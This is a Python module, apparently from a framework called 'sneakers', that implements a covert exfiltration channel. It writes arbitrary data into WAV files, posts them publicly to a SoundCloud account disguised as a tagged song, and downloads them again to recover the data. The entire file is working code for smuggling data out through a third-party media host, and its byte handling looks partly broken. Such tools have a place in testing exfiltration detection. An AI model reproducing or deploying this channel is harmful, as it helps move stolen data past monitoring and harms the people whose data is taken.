import random
import struct
import wave
import soundcloud
import os, re, urllib
from sneakers.modules import Channel, Parameter

class Soundcloudchannel(Channel):
    description = """\
        Posts data to Soundcloud encoded into randomly generated WAV files.
    """

    params = {
            'sending': [
                Parameter('ID', True, 'Application ID for Soundcloud API'),
                Parameter('secret', True, 'Application secret for Soundcloud API'),
                Parameter('username', True, 'Username of Soundcloud account to post data to'),
                Parameter('password', True, 'Password of Soundcloud account to post data to'),
                Parameter('song_name', True, 'Name to be shown for "song" on soundcloud')
                ],
            'receiving': [
                Parameter('username', True, 'Username for user to download sound from.'),
                Parameter('song_name', True, 'Name of the sound file to be downloaded')
                ]
            }

    maxLength = 44100 * 60 * 180
    maxHourly = 120

    def send(self, data):
        client = soundcloud.Client(
            client_id = self.param('sending', 'ID'),
            client_secret = self.param('sending', 'secret'),
            username = self.param('sending', 'username'),
            password = self.param('sending', 'password')
        )

        frames = []

        for i in data:
            frames.append(i)
            frames.append(',')

        wf = wave.open('output.wav', 'wb')
        wf.setnchannels(1)
        wf.setframerate(44100)
        wf.setsampwidth(2)
        wf.writeframes(b''.join(frames))
        wf.close()

        #print("Done creating sound file")
        track = client.post('/tracks', track={
            'title': self.param('sending', 'song_name'),
            'sharing':'public',
            'asset_data': open('output.wav','rb'),
            'tag_list':'tag1 \"hip hop\"',
            'downloadable': 'true' })
        #print("Done uploading")

        os.remove('output.wav')

        return

    def receive(self):
        urllib.urlretrieve("http://soundcloud.com/" + self.param('receiving', 'username') +\
                "/" + self.param('receiving', 'song_name')+ "/download", 'file.wav')
        wf = wave.open('file.wav', 'r')
        data = wf.readframes(wf.getnframes())
        return [data]
